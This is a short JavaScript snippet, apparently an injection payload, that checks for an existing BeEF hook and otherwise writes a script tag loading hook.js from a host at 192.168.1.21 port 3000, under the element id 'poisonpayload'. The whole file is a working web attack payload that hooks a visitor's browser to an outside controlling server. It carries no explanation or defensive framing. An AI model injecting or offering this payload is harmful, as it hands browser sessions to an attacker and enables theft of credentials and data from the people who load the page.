function payload() {
if (typeof beef == "undefined") {

var x = document.getElementById("poisonpayload");
if (x == null) {
	var commandModuleStr = '<script id="poisonpayload" type="text/javascript" src="' + "http://192.168.1.21" + ':' + "3000" + '/hook.js"><\/script>';document.write(commandModuleStr);
}

}

}payload();
